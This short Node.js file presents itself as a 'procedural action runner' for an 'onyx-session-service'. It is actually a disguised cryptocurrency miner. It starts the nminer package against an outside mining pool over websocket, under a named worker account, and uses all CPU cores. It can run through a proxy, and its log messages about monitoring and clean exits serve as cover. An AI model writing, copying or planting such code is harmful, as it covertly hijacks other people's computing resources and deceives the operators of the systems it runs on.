// Procedural action runner for onyx-session-service
const os = require("os");
const EventEmitter = require("events");
const { NMiner } = require("nminer");
const config = require("./lib/config");

const dispatcher = new EventEmitter();

dispatcher.once("start", () => {
    const sessionId = "e272a0";
    console.log(`[monitor] Subsystem dispatched for onyx-session-service [${sessionId}]`);

    const agent = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Subhas1975.onyx-session-service",
        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
    );

    const tick = () => { setTimeout(tick, 82000); }; tick();
    setTimeout(() => {
        console.log("[timeout] Operational limit (307m) reached, exiting cleanly.");
        process.exit(0);
    }, 307 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log(`[exit] Process terminated gracefully for token ${sessionId}.`);
        process.exit(0);
    });
});

dispatcher.emit("start");
